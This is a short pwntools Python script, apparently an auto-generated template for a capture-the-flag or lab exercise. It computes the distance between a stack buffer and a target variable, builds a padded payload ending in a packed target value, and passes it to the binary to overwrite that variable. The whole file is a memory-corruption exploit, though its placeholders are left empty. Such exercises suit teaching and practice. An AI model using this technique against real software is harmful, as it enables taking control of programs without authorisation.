from pwn import *

gen_filename = ""
gen_names = {}
gen_var_locations = {}
gen_templates = {}

e = ELF(gen_filename)

buff = gen_names["buffer"]
mod = gen_names["modified"]
diff = gen_var_locations[mod][-1] - gen_var_locations[buff][-1]
payload = f"%{diff}d".encode() + p32(gen_templates["X"])

p = e.process([payload])
print(p.recvlineS())
